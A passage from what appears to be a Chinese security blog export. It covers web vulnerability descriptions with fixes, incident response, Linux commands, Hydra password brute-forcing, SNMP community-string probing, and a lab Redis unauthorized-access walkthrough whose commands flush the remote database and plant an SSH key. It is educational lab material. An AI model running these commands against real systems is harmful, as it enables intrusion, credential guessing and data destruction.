全面进行Web站点安全设置，防止攻击者能够仿冒成站点的其他用户来执行操作；确保Web站点对用户的安全分级授权方式越级和跨出合法区域的访问；对使用的Web应用系统进行升级和放漏洞补丁操作。 关闭WEB服务器目录浏览功能，对CMS进行安全配置或者对低版本的CMS进行补丁升级。 定期对相关管理人员和技术人员进行安全培训，提高安全技术能力和实际操作能力。 建立和完善一套有效的安全管理制度，对网站的日常维护和使用进行规范。 弱口令风险等级:中危 1.漏洞描述 弱密码即容易破译的密码，多为简单的数字组合、帐号相同的数字组合、键盘上的临近键或常见姓名、终端设备出厂配置的通用密码等都属于弱密码范畴。攻击者很容易预测用户名和密码，登录应用程序，从而获取未获授权的特权。 由于网站管理员缺乏足够的安全意识，使用了默认口令或较简单的口令，致使黑客可以轻易猜测到口令。 2.解决建议 加强口令密码管理制度，设置强口令，在大型信息系统和运维环境复杂的情况下，可以采用运维管理设备进行密码管理。 增加验证机制，防爆破机制，限制ip＋cookie访问次数。 建立和完善一套有效的安全管理制度，对网站的日常维护和使用进行规范。 黑链风险等级:中危 1.漏洞描述 网站源代码中发现大量黑链，这表示网站受到入侵，黑客已经获取到一定权限。 2.解决建议 对源代码进行全面审查，删除黑链 启用了TRACE风险等级:中危 1.漏洞描述 TRACE方法用于调用请求消息的远程应用层回送。 请求的最终接收方应该以 200（OK）响应的实体主体向客户端反映接收到的消息。 TRACE 可让客户端查看在请求链的另一端收到什么，并将这项数据用于测试或诊断信息。 TRACE方法是HTTP（超文本传输）协议定义的一种协议调试方法，该方法使得服务器原样返回任何客户端请求的内容。 2.漏洞危害： 恶意攻击者可以通过TRACE方法返回的信息了解到网站前端的某些信息，如缓存服务器等，从而为进一步的攻击提供便利。 3.解决建议 a、2.0.55以上的Apache服务器，在httpd.conf的尾部添加：TraceEnable off。 b、如果使用的是Apache： 确认rewrite模块激活（httpd.conf，下面一行前面没有#): LoadModule rewrite_module modules/mod_rewrite.so 在各虚拟主机的配置文件里添加如下语句：123RewriteEngine OnRewriteCond %&#123;REQUEST_METHOD&#125; ^TRACERewriteRule .* -[F] 慢速攻击风险等级:中危 1.漏洞描述 针对任意HTTP Server，建立一个连接，以很低的速度发包，并保持住这个连接不断开。如果客户端持续建立这样的连接，那么服务器上可用的连接池将很快被占满，从而导致拒绝服务攻击。 2.解决建议 a、限制web服务器的HTTP头部传输的最大许可时间。 b、升级到最新版的apache。 c、限制web服务器的HTTP头部传输的最大许可时间，在apache中添加mod_reqtimeout.so模块，Apache2.2.15后，该模块已经被默认包含，在httpd.conf中添加 LoadModule reqtimeout_module modules/mod_reqtimeout.so，在httpd.conf中添加RequestReadTimeout header=20-40,MinRate=500 body=20,MinRate=500。重启apache服务，测试是否正常。 host头部攻击风险等级:中危 1.漏洞描述 为了方便的获得网站域名，开发人员一般依赖于HTTP Host header。例如，在php里用1$_SERVER[\"HTTP_HOST\"]。 但是这个header是不可信赖的，如果应用程序没有对host header值进行处理，就有可能造成恶意代码的传入。 2.解决建议 web应用程序应该使用SERVER_NAME而不是host header。 在Apache和Nginx里可以通过设置一个虚拟机来记录所有的非法host header。 在Nginx里还可以通过指定一个SERVER_NAME名单，Apache也可以通过指定一个SERVER_NAME名单并开启UseCanonicalName选项。 KindEditor3.5.5遍历目录漏洞风险等级:中危 1.漏洞描述 KindEditor是一套开源的HTML可视化编辑器，主要用于让用户在网站上获得所见即所得编辑效果，兼容IE、Firefox、Chrome、Safari、Opera等主流浏览器。KindEditor目录/php/file_manager_json.php，存在遍历目录漏洞。 2.解决建议 目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载： http://www.kindsoft.Net/ cookie缺少HttpOnly属性1.漏洞描述 会话cookie中缺少HttpOnly属性会导致攻击者可以通过程序(JS脚本、Applet等)获取到用户的cookie信息，造成用户cookie信息泄露，增加攻击者的跨站脚本攻击威胁。 HttpOnly是微软对cookie做的扩展，该值指定cookie是否可通过客户端脚本访问。Microsoft Internet Explorer 版本 6 Service Pack 1和更高版本支持cookie属性HttpOnly。 如果在Cookie中没有设置HttpOnly属性为true，可能导致Cookie被窃取。窃取的Cookie可以包含标识站点用户的敏感信息，如ASP.NET会话ID或Forms身份验证票证，攻击者可以重播窃取的Cookie，以便伪装成用户或获取敏感信息，进行跨站脚本攻击等。 如果在Cookie中设置HttpOnly属性为true，兼容浏览器接收到HttpOnly cookie，那么客户端通过程序(JS脚本、Applet等)将无法读取到Cookie信息，这将有助于缓解跨站点脚本威胁 2.解决建议 向所有会话cookie中添加“HttpOnly”属性。 Php.ini session.cookie_httponly= 存在永久性cookie1.漏洞描述 发现目标存在永久性Cookie。这可能使攻击者通过其他方式获得用户的会话凭证，这个时候，例如利用xss漏洞获得Cookie或者Session劫持就很有效了，具体分析应用程序的认证，然后使用某些技巧，甚至可以即使对方退出程序也一样永久性获得对方的身份，在未来很长时间甚至永久的控制账户。 2.解决建议 不要设置cookie为永久性的，修改cookie的属性expires的值，将cookie在会话关闭时则无效；或者一段时间内，过期后无效。 CI配置文件 application/config/config.php关于SESSION COOKIE的配置参数 在源码中存在用户名和密码泄露风险等级:中危 1.漏洞描述 检测到目标站点的源码信息中可能存在用户名或者密码此类的敏感信息，从而可能造成用户或者站点的敏感信息泄露。如果用户名或者密码信息真实存在，那么攻击者便可以利用此信息，对目标站点进行进一步有效的攻击。由于该插件使用模式匹配方式检测，可能会出现误报，需要人工进行进一步核实。 2.解决建议 删除此类文件或限制此类文件的访问权限。 错误页面web服务器版本泄露风险等级:中危 1.漏洞描述 Web服务器未能正确处理异常请求导致Web服务器版本信息泄露，攻击者收集到服务器信息后可进行进一步针对性攻击。 2.解决建议 临时修复建议如下： 1.关闭web服务器错误提示。 2.关闭运行平台的错误提示。 3.建立错误机制，不要把真实的错误反馈给访问者。 目标网站存在上传下载相关的目录和文件1.漏洞描述 检测到目标网站存在上传下载相关的目录和文件。上传目录一般具有可写权限。攻击者可以预测文件上传的路径，便于和目标站点的其他漏洞攻击结合攻击目标服务器。 2.解决建议 检查此类目录的访问权限。如果不需要这些目录，建议删除。 后台登录入口暴露风险等级:中危 1.漏洞描述 检查到目标应用的后台登陆入口。管理员应用程序一般用于网站的后台管理，具有全部的权限。这些应用程序可能包含一些敏感信息或具有较低的安全保护，攻击者可以通过该文件获取敏感信息或者进入网站后台，进行恶意操作。 2.解决建议 加强访问此类文件的认证和使用安全。如果不需要此类文件，请删除。修改为不可预测的文件名。对管理地址进行更名，让管理地址变得不可猜测 存在web默认目录风险等级:中危 1.漏洞描述 web应用架构中的目录都采用常见的目录名。如图片目录images,JavaScript目录js,不同的目录潜在的危险是不同的。攻击者一般利用常见目录中可能包含的敏感文件获取敏感信息。 2.解决建议 如果不需要这些目录，可以删除此类目录；或者严格限制目录的访问权限。 form表单验证码点击不变风险等级:中危 1.漏洞描述 在form表单中，验证码出现第一次之后，点击验证码图片，验证码不会变，只有在刷新页面的时候，验证码才会改变，这会导致攻击者可以绕开验证码，而对表单进行爆破。 2.解决建议 加强验证码验证模块 危险的HTTP请求类型风险等级:中危 1.漏洞描述 web服务器或应用服务器是以不安全的方式配置的，会在web服务器上上传、修改或删除web页面、脚本和文件。 2.解决建议 如果服务器不需要支持 WebDAV，请务必禁用它，或禁止如下不必要的 HTTP 方法。 逻辑设计缺陷1.漏洞描述 逻辑设计缺陷是因为产品在最初设计时由于未考虑全面，而使产品在使用中存在的一些潜在的缺陷。 2.解决建议 在输入接口设置验证，如token，验证码等。注册界面的接口不要返回太多敏感信息，以防遭到黑客制作枚举字典。验证码请不要以短数字来甚至，最好是以字母加数字进行组合，并且验证码需要设定时间期限。 https://zhuanlan.zhihu.com/p/19728040http://www.freebuf.com/vuls/112339.html 后门1.漏洞描述 目标网站已经被黑客入侵，拿下webshell并留下后门。 2.解决建议 管理员定期手工或用专业的webshell扫描工具全面清查服务器中的文件，删除webshell。 任意文件读取风险等级:中危 1.漏洞描述 由于CMS编写时参数过滤不严，黑客可以用../的方式访问其他目录中的文件。 2.解决建议 严格检查变量是否已经初始化;在服务器本地文件及远程文件，进行严格的检查，参数中不允许出现../之类的目录跳转符。 未授权访问1.漏洞描述 由于CMS编写时采用本地验证机制或在服务器端验证不严，黑客可以采取绕过的方式对一些敏感信息或文件进行访问或操作。 2.解决建议 将对应的应用系统进行升级。 加强网站的验证机制与过滤机制，防止用户绕过过滤机制对一些敏感信息或危险功能进行访问和操作。 上传漏洞1.漏洞描述 由于网站管理员的配置不当或者CMS的编写时未对上传的文件进行检查过滤或者过滤不严，致使黑客可以上传木马拿到webshell。 2.解决建议 客户端和服务端检测文件大小，文件后缀和文件内容等，并严格控制上传目录，不向用户暴露出具体路径。 错误详情泄漏漏洞1.漏洞描述 页面含有CGI处理错误的代码级别的详细信息，例如sql语句执行错误原因，php的错误行数等。 2.检测方法 修改参数为非法参数，看页面返回的错误信息是否泄漏了过于详细的代码级别的信息。 3.修复方案 将错误信息对用户透明化，在CGI处理错误后可以返回友好的提示语以及返回码。但是不可以提示用户出错的代码级别的详细原因。","categories":[{"name":"漏洞描述","slug":"漏洞描述","permalink":"http://airs-sec.com/categories/漏洞描述/"}],"tags":[{"name":"漏洞描述 解决建议","slug":"漏洞描述-解决建议","permalink":"http://airs-sec.com/tags/漏洞描述-解决建议/"}],"keywords":[{"name":"漏洞描述","slug":"漏洞描述","permalink":"http://airs-sec.com/categories/漏洞描述/"}]},{"title":"应急响应总结","slug":"应急响应总结","date":"2017-03-02T12:59:33.000Z","updated":"2017-03-21T06:49:38.579Z","comments":true,"path":"2017/03/02/应急响应总结/","link":"","permalink":"http://airs-sec.com/2017/03/02/应急响应总结/","excerpt":"经验作为一个web测试人员，经常会遇到客户网站被黑的情况，客户叫我们去追查和解决问题的过程，通常叫做应急响应。 如果在政府单位，可能这种情况的确是比较紧急的。 如果遇到应急响应，我们该怎么做呢？","text":"经验作为一个web测试人员，经常会遇到客户网站被黑的情况，客户叫我们去追查和解决问题的过程，通常叫做应急响应。 如果在政府单位，可能这种情况的确是比较紧急的。 如果遇到应急响应，我们该怎么做呢？ 应急响应步骤1.接到客户电话或者老板告诉你，得知，网站被攻击，网站存在异常，网站打不开。 2.在得知了安全事件发生之后，该如何处理呢？ A.第一时间就是如何保障客户的系统能尽快的恢复，而不会影响客户的业务，跟客户沟通最有效的解决方式。 这种解决方式有暂时性和永久性，暂时性指的是先检测网站存在哪些异常，分析日志，病毒扫描，找出木马，清除木马，保障客户的系统不会再一次出现打不开的情况。永久性指的就是重做系统，重新部署业务。 考虑客户的情况，选择不同的方式。但无论哪种方式，能尽快解决客户的当前问题才是最重要的，毕竟分析攻击来源，不是一时半会就能分析出来的。 B.安全加固方面 利用客户现有的网络拓扑，把相应的安全设备利用起来，做好相应的安全策略，尽量不把服务器直接暴露在公网。而是通过防火墙进行映射，服务器配置内网地址。关闭服务器上不需要的端口，如3389，如果要开远程的话，就通过连接到客户的内网pc，通过pc连接到服务器，这样是比较安全的或者直接在防火墙上开启vpn。 在服务器前放置WAF进行防护，针对各种攻击进行拦截。 C.业务恢复后，网络加固了之后，对应用在进行进一步的测试，对安全设备的瓶颈进行预估，而不会说由于安全设备的防护不足，导致服务器存在攻击的危险。 D.所有的东西都完成之后，最后，如果在可能的情况下，对以前受攻击的环境进行模拟，从而分析出这次攻击的主要原因，攻击者如何连接到服务器的，分析受到攻击的原因，并形成相应的报告。 应急响应流程 应急响应精妙总结 来源:piaca 被“黑了” 被入侵 被蠕虫 被钓鱼 被DDOS 被劫持 为什么做应急响应 保障业务 还原攻击 明确意图 解决方案 查漏补缺 司法途径 怎么做应急响应 确定攻击时间 查找攻击线索 梳理攻击流程 实施解决方案 定位攻击人、取证 为什么反渗透 被动变主动 攻击者都在做什么 确认攻击者是谁 取证 总结： 业务角度 保障业务优先 对抗角度 了解对手 技术角度 攻击技术 日志、流量等数据","categories":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}],"tags":[],"keywords":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}]},{"title":"linux下查找文件总结","slug":"linux下查找文件总结","date":"2017-01-20T03:39:11.000Z","updated":"2017-01-20T08:50:51.685Z","comments":true,"path":"2017/01/20/linux下查找文件总结/","link":"","permalink":"http://airs-sec.com/2017/01/20/linux下查找文件总结/","excerpt":"","text":"linux下面的查找文件的命令有好多，每个命令都有不同的使用方式和使用场合，合理的使用查找命令，可以事半功倍的找到自己想找到的任意文件。 主要的查找命令有 12语法：which locate whereis find 1.which which指令会在环境变量$PATH设置的目录里查找符合条件的文件。查找的路径时$PATH环境变量路径下的程序。打印出来的是全路径 1which [options] program_name [...] 12345[root@xc ~]# which mysql/usr/bin/mysql[root@xc ~]# which httpd/usr/sbin/httpd 12345-i，--read-alias 打印出别名，这个是默认的选项[root@xc ~]# which -i lsalias ls='ls --color=tty' /bin/ls 12345--skip-alias 跳过别名，不打印别名[root@xc ~]# which --skip-alias ls/bin/ls` which是在PATH环境变量下查找相应的文件，环境变量的不同会导致搜索结果的不同 2.locate ocate指令用于查找符合条件的文件，查找合乎范本样式条件的文件或目录。它会去保存文件与目录名称的数据库内（/var/lib/locatedb）,这个数据库含有本地所有文件信息，linux会自动创建这个数据库，所以搜索不到不在数据库中的文件，一般在查找数据库前，使用updatedb手动更新下数据库。 相当于find -name 123语法：locate [OPTION]... PATTERN... 实例：查找httpd 12345678910111213141516#locate httpd/etc/httpd/etc/httpd/conf/etc/httpd/conf.d/etc/httpd/logs/etc/httpd/modules/etc/httpd/run/etc/httpd/conf/httpd.conf/etc/httpd/conf/magic/etc/httpd/conf.d/README/etc/httpd/conf.d/nagios.conf/etc/httpd/conf.d/php.conf/etc/httpd/conf.d/proxy_ajp.conf/etc/httpd/conf.d/welcome.conf/etc/logrotate.d/httpd/etc/rc.d/init.d/httpd locate在指定的数据库里查找相应的索引。 3.whereis whereis指令会在特定目录中查找符合条件的文件。这些文件的烈性应属于原始代码，二进制文件，或是帮助文件。 1234567891011121314语法：whereis [-bfmsu][-B &lt;目录&gt;...][-M &lt;目录&gt;...][-S &lt;目录&gt;...][文件...]参数：-b 只查找二进制文件。 -B &lt;目录&gt; 只在设置的目录下查找二进制文件。 -f 不显示文件名前的路径名称。 -m 只查找说明文件。 -M &lt;目录&gt; 只在设置的目录下查找说明文件。 -s 只查找原始代码文件。 -S &lt;目录&gt; 只在设置的目录下查找原始代码文件。 -u 查找不包含指定类型的文件。 实例说明：123456789101112131415161718#whereis httpdhttpd: /usr/sbin/httpd.event /usr/sbin/httpd /usr/sbin/httpd.worker /etc/httpd /usr/lib/httpd /usr/share/man/man8/httpd.8.gz#这个说明没装[root@localhost ~]# whereis tomcattomcat:#查找二进制文件，-b[root@localhost ~]# whereis -b httpdhttpd: /usr/sbin/httpd /usr/sbin/httpd.event /usr/sbin/httpd.worker /etc/httpd /usr/lib64/httpd#查找帮助手册，-m[root@localhost ~]# whereis -m httpdhttpd: /usr/share/man/man8/httpd.8.gz#查找源文件[root@localhost ~]# whereis -s svnsvn: 注意：whereis用于程序名的搜索，只查找二进制程序，源码和帮助页 find find在指定目录下查找文件 1find 路径 (选项) (参数)... ==选项：== ==参数== 文件、目录、起始目录 ## 实例： 1.列出当前目录下的文件和目录 1find . 2.在/home目录下查找所有txt的文件 1find /home -name \"*.txt\" 3.忽略大小写 1find /home -iname \"*.txt\" 4.查找所有的txt和pdf文件 1find . -name \"*.txt\" -o -name \"*.pdf\" 5.匹配文件路径或文件 1find /usr/ -path \"*local*\" 6.根据文件类型进行搜索 123456789find / -type 类型参数f 普通文件d 目录l 管道c 字符设备s 套接字b 块设备p FIFO 6.根据文件的时间戳进行搜索 1find / -type f 时间戳 访问时间（-atime/天，-amin/分钟）：用户最近一次的访问时间 修改时间（-mtime/天，-mmin/分钟）：用户最近一次的修改时间 变化时间（-ctime/天，-cmin/分钟）:文件数据元，最后一次的修改时间 -代表多少时间内，+代表多少时间外 搜索7天内被访问过的文件 1find / -type f -atime -7","categories":[{"name":"linux","slug":"linux","permalink":"http://airs-sec.com/categories/linux/"}],"tags":[],"keywords":[{"name":"linux","slug":"linux","permalink":"http://airs-sec.com/categories/linux/"}]},{"title":"redis未授权访问漏洞","slug":"redis未授权访问漏洞","date":"2017-01-08T15:05:49.000Z","updated":"2017-01-16T06:41:07.846Z","comments":true,"path":"2017/01/08/redis未授权访问漏洞/","link":"","permalink":"http://airs-sec.com/2017/01/08/redis未授权访问漏洞/","excerpt":"redis是一个开源、支持网络、基于内存、键值对存储数据库，使用ANSI C编写。从2013年5月开始，Redis的开发由Pivotal赞助。在这之前，其开发由VMware赞助。 环境：ceontos6.5(客户端)，kali2.0(redis服务器)","text":"redis是一个开源、支持网络、基于内存、键值对存储数据库，使用ANSI C编写。从2013年5月开始，Redis的开发由Pivotal赞助。在这之前，其开发由VMware赞助。 环境：ceontos6.5(客户端)，kali2.0(redis服务器) redis安装123456789[root@localhost ~]# wget http://download.redis.io/releases/redis-2.8.13.tar.gz[root@localhost ~][root@localhost ~]# yum -y install gcc gcc-c++ libstdc++-devel[root@localhost ~]# tar -xzf redis-2.8.13.tar.gz[root@localhost ~]# cd redis-2.8.13[root@localhost redis-2.8.13]#make 简单测试 注意： 到make那一步就可以，不用make install 运行src/redis-server出错 3.但服务还是起来了 修改redis登陆密码 进入redis的安装目录，找到redis.conf文件 发现不输入登陆密码，执行不了命令 正确的登入方式 1redis-cli -h 127.0.0.1 -p 6379 -a 密码 改密码，我们也可以通过命令修改，而不用打开配置文件 12345678redis 127.0.0.1:6379[1]&gt; config set requirepass my_redis OK redis 127.0.0.1:6379[1]&gt; config get requirepass 1) \"requirepass\" 2) \"my_redis\" # my_redis为密码 上面配了那么多，接下来就是来验证redis未授权访问漏洞 redis未授权访问漏洞(客户端centos6.5上操作)1. 查看客户端（kali）ip、内核、登陆redis 2.生成密钥1# 3.ssh-keygen -t rsa -C \"redis\" 4.然后执行相应的命令123456789#将公钥重定向到一个文本文件中root@kali:~# (echo -e \"\\n\\n\"; cat ./.ssh/id_rsa.pub; echo -e \"\\n\\n\") &gt; redis.txtroot@kali:~# redis-cli -h 192.168.179.146 -a [my_redis_password] flushallOKroot@kali:~# cat redis.txt | redis-cli -h 192.168.179.146 -a [my_redis_password] -x set pwnOK 注：[my_redis_password]为密码，这里我设置了密码，不过在实际环境中，一般对方的漏洞服务器是没有设置密码的。-_- 5.登陆到redis服务器，并配置 同理，如果没有密码，我们可以直接 1# redis-cli -h 远程redis主机的ip 6.通过密钥登陆，直接登录到服务器 参考： 1.刀刀的专栏2.www.loner.fm","categories":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}],"tags":[],"keywords":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}]},{"title":"SNMP服务安装及漏洞利用","slug":"SNMP服务安装及漏洞利用","date":"2017-01-08T13:48:43.000Z","updated":"2017-01-16T06:39:37.832Z","comments":true,"path":"2017/01/08/SNMP服务安装及漏洞利用/","link":"","permalink":"http://airs-sec.com/2017/01/08/SNMP服务安装及漏洞利用/","excerpt":"","text":"SNMP为简单网络管理协议，该协议能支持网络管理系统，用于检测网络上的主机是否存在值得关注的情况。该协议是互联网工程工作小组（IETF，Internet Engineering Task Force）定义的internet协议簇的一部分。SNMP的目标是管理互联网Internet上众多厂家生产的软硬件平台，因此SNMP受Internet标准网络管理框架的影响也很大。SNMP已经出到第三个版本的协议，其功能较以前已经大大地加强和改进了。 snmp存在默认的团体字符串漏洞，通过这个漏洞可以获取主机的相关信息 环境：cento6.5 1.安装服务1234567891011##安装# yum install net-snmp -y ##启动服务# /etc/init.d/snmpd start##查看状态# netstat -antpleu |grep snmptcp 0 0 127.0.0.1:199 0.0.0.0:* LISTEN 0 35513 3300/snmpd udp 0 0 0.0.0.0:161 0.0.0.0:* 0 35511 3300/snmpd 2.发现漏洞 2.1 通过snmpwalk可以有效的进行检测 1# snmpwalk -v 2c -c public ip地址 2.2通过namp自带的snmp检测模块 1# nmap -Pn -sU -p161 --script=brute 192.168.179.146 3.如何修复12345678修改默认的团体字符串名 vim /etc/snmp/snmpd.conf#允许任何IP通过public来连接com2sec notConfigUser default public#只允许1.1.1.1来使用public连接com2sec notConfigUser 1.1.1.1 public snmpwalk语法snmpwalk 交换机或路由器IP地址 -c SNMP读密码 -v 1或2(代表SNMP版本) OID(对象标示符) 用法举例: 12345678910111213141、snmpwalk -c public -v 1 -m ALL 192.168.30.49 .1.3.6.1.2.1.25.1 得到取得windows端的系统进程用户数等2、snmpwalk -c public -v 1 -m ALL 192.168.30.49 .1.3.6.1.2.1.25.2.2 取得系统总内存3、snmpwalk -c public -v 1 -m ALL 192.168.30.49 hrSystemNumUsers4、snmpwalk -c public -v 1 -m ALL 192.168.30.49 .1.3.6.1.2.1.4.20 取得IP信息5、snmpwalk -v 2c -c public 192.168.30.49 system 查看系统信息6、snmpwalk -v 1 192.168.30.49 -c public ifDescr7、如果你也不知道具体参数，那么就执行snmpwalk -v 2c -c public 192.168.30.49，就可以看到所有信息。 参考： 1.流浪的牛2.www.loner.fm3.百度经验","categories":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}],"tags":[],"keywords":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}]},{"title":"如何破解ftp、telnet、mysql的用户名和密码","slug":"如何破解ftp-telnet-mysql的用户名和密码","date":"2017-01-08T13:14:42.000Z","updated":"2017-01-08T13:45:26.663Z","comments":true,"path":"2017/01/08/如何破解ftp-telnet-mysql的用户名和密码/","link":"","permalink":"http://airs-sec.com/2017/01/08/如何破解ftp-telnet-mysql的用户名和密码/","excerpt":"ftp、telnet和mysql服务由于管理员的配置不当或安全意识不足，经常存在空密码、默认密码或弱密码的情况，针对这种情况我们可以通过暴力破解工具对密码进行猜测，从而获取到想要的密码。 环境： hydra、metasploitable2靶机","text":"ftp、telnet和mysql服务由于管理员的配置不当或安全意识不足，经常存在空密码、默认密码或弱密码的情况，针对这种情况我们可以通过暴力破解工具对密码进行猜测，从而获取到想要的密码。 环境： hydra、metasploitable2靶机 1.确定端口，通过nmap进行扫描。 2.准备字典文件，字典文件根据情况而定，如果你知道用户名可以直接指定用户名，如果都不知道，那就要准备一个用户名字典和密码字典。 3.通过hydra对ftp进行破解 4.对telnet进行破解 5.对mysql服务进行破解 当然破解密码的软件不止这一款，在kali下有很多破解工具，需要的自己了解,对密码的破解主要看你的字典强不强大，机器性能好不好，这两者影响很大，通过也有CPU和GPU之分，GPU性能非常高。 hydra语法 hydra著名黑客组织thc的一款开源的暴力破解工具，其有windows和linux多个平台的版本,它能对需要网络登录的系统进行快速的字典攻击，包括FTP、POP3、IMAP、Netbios、Telnet、HTTP Auth、LDAP NNTP、VNC、ICQ、Socks5、PCNFS等协议！ 12345678910111213141516171819202122232425262728hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-SuvVd46] [service://server[:PORT][/OPT]]options:-l 登录名 或者 -L 字典 使用登录名 或者 从字典中获取登录名单-p 密码 或者 -P 字典 使用单个密码 或者 从字典中获取密码列表-C 文件 使用冒号分割格式 例如 \"登录名:密码\"来代替-L/-P参数-e ns 附加选项,n 是表示空密码,s 尝试使用密码进行破解-o 文件 将找到的密码写在文件里面 以此代替输出到屏幕上-t 计划任务同时运行几个任务(默认是: 16)-M 文件服务器列表(译者:ip列表),一行一条-w 时间定义超时时间秒数(默认是: 30)-f 在使用-M参数以后找到第一对登录名或者密码的时候中止破解-s 指定端口号-v/V 显示破解详情[service://server[:PORT] 也可以使用这种格式，如ftp://192.168.100.1:3389","categories":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}],"tags":[],"keywords":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}]},{"title":"web安全深度剖析-第三章-信息探测","slug":"web安全深度剖析-第三章-信息探测","date":"2016-11-10T05:41:08.000Z","updated":"2016-11-10T05:43:17.987Z","comments":true,"path":"2016/11/10/web安全深度剖析-第三章-信息探测/","link":"","permalink":"http://airs-sec.com/2016/11/10/web安全深度剖析-第三章-信息探测/","excerpt":"","text":"这本书中只介绍了google hack、namp和一款不常见的dirbuster。","categories":[{"name":"阅读","slug":"阅读","permalink":"http://airs-sec.com/categories/阅读/"}],"tags":[],"keywords":[{"name":"阅读","slug":"阅读","permalink":"http://airs-sec.com/categories/阅读/"}]},{"title":"web安全深度剖析-第二章-深入HTTP请求流程","slug":"web安全深度剖析-第二章-深入HTTP请求流程","date":"2016-11-10T01:35:15.000Z","updated":"2016-11-10T04:56:21.324Z","comments":true,"path":"2016/11/10/web安全深度剖析-第二章-深入HTTP请求流程/","link":"","permalink":"http://airs-sec.com/2016/11/10/web安全深度剖析-第二章-深入HTTP请求流程/","excerpt":"第二章 深入http请求流程 由于黑客攻击大部分发生在web层面，web层最主要的协议就是http协议，所以了解http的主要通信流程就很重要。 发起HTTP请求URL格式： 协议://服务器IP[:端口]/路径[?查询] 例如：http://www.tests.com/post/httpxieyi.html就是个标准的URL 123名词浏览器 curl 无连接","text":"第二章 深入http请求流程 由于黑客攻击大部分发生在web层面，web层最主要的协议就是http协议，所以了解http的主要通信流程就很重要。 发起HTTP请求URL格式： 协议://服务器IP[:端口]/路径[?查询] 例如：http://www.tests.com/post/httpxieyi.html就是个标准的URL 123名词浏览器 curl 无连接 请求与响应服务器与客户端通信的时候，发起方发出请求包，接收方进行响应，返回一个响应包。 请求包 响应包 详细信息 12345678910GET / HTTP/1.1 #请求头Host: api.wipmania.com #主机头，请求的主机User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0 #浏览器标识/主机标识Accept: text/html,text/plain #可接收的文本格式Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 #语言Accept-Encoding: null #编码Accept-Charset: null #字符集Typ: ffplugin2 #插件Ver: 3.0.9 #版本Connection: keep-alive #连接状态，长连接 12345请求方法：GET POST HEAD PUT DELETE TRACE OPTIONS这些方法都放在请求头里，需要注意的是TRACE和OPTIONS方法，这些方法可能被利用 1234567891011121314151617http状态码：1xx：信息提示2xx：成功3xx：重定向4xx：客户端错误代码5xx：服务器内部错误常见的状态码如下：200：客户端请求成功302：重定向404：请求的资源不存在400：客户端请求有语法错误，不能被服务器所理解401：请求为授权403：服务器收到请求，但是拒绝提供服务500：服务器内部错误503：服务器当前不能处理客户端请求，一段时间后恢复正常 截取http请求burp suite 绕过本机js验证js在本地验证用户的提交，而服务器端没有验证用户的提交 1.brup设置代理2.浏览器设置代理监听端口3.输入访问的地址，burp查看拦截信息4.对拦截到的信息进行修改，构造xss语句5.xss构造成功 fiddle的使用黑帽SEO搜索引擎劫持是黑帽seo手段的一种 症状： 直接输入域名可以进入自己的网站，而使用百度、google等搜索引擎搜索关键字看到自己的网站后，打开却跳转到其他的网站。 原因： 利用http请求中的referer头和user-agent头达到欺骗搜索引擎的目的，referer头用于告诉web服务器，用户从哪个页面找过来的，而user-agent头则用于告诉web服务器用户使用的浏览器和操作系统信息。当通过搜索引擎打开此网站时，会引出源页面头（referer）。 如： referer：http://www.baidu.com/s?tn=baiduhome_pg&amp;ie=utf-8 利用步骤： 1.建立劫持搜索引擎库，如：以百度、google等域名为关键字。2.获取http referer头3.遍历搜索引擎库，并与referer的内容比较，如果两者相同或存在搜索引擎关键字，那么页面发生跳转，也就是域名劫持 ==内容参考：书籍：张炳帅-web安全深度剖析==","categories":[{"name":"阅读","slug":"阅读","permalink":"http://airs-sec.com/categories/阅读/"}],"tags":[],"keywords":[{"name":"阅读","slug":"阅读","permalink":"http://airs-sec.com/categories/阅读/"}]},{"title":"web安全深度剖析-第一章-web安全简介","slug":"web安全深度剖析-web安全简介","date":"2016-11-10T01:11:33.000Z","updated":"2016-11-10T04:55:44.274Z","comments":true,"path":"2016/11/10/web安全深度剖析-web安全简介/","link":"","permalink":"http://airs-sec.com/2016/11/10/web安全深度剖析-web安全简介/","excerpt":"","text":"第一章 web安全简介 服务器是如何被入侵的 攻击者想要对计算机进行渗透，有一个条件是必需的：就是攻击者的计算机与服务器之间必需是能正常通信的。 服务器通常以服务的方式对外开放。 主要战场：web层 风险点图： ==内容参考：书籍：张炳帅-web安全深度剖析==","categories":[{"name":"阅读","slug":"阅读","permalink":"http://airs-sec.com/categories/阅读/"}],"tags":[],"keywords":[{"name":"阅读","slug":"阅读","permalink":"http://airs-sec.com/categories/阅读/"}]},{"title":"vim高频使用技巧","slug":"vim高频使用技巧","date":"2016-09-05T12:52:41.000Z","updated":"2016-09-05T13:14:29.432Z","comments":true,"path":"2016/09/05/vim高频使用技巧/","link":"","permalink":"http://airs-sec.com/2016/09/05/vim高频使用技巧/","excerpt":"","text":"来自：http://wyh.life/article/2014/06/24/vim • ctrl-c 回到命令模式。• u / ctrl-r 撤销/重复操作。• 9G / :9 定位到第9行。• :9y 拷贝第9行，不必首先移动光标。• ctrl-o 回到此前光标位置。• ZZ / ZQ 保存并退出/无条件退出。• = 格式化选定文本。• ggvG 全选文件内容。• gg=G 格式化文件。• shift-v 选取行。• vip 选取当前光标所在段落。• yit/dit/cit 对标签内的文本进行操作。• mx 添加书签。• &lt; 取消缩进文本。• 5&lt;&lt; 对5行文本取消缩进。• :marks 查看所有书签。• delm X 删除书签X。• :ls 查看缓冲区。• :bN 打开缓冲区N。• :bn / bp / &lt;ctrl-^&gt;缓冲区切换。• :shell / :sh / !cmd 执行shell命令。• ctrl-z / fg 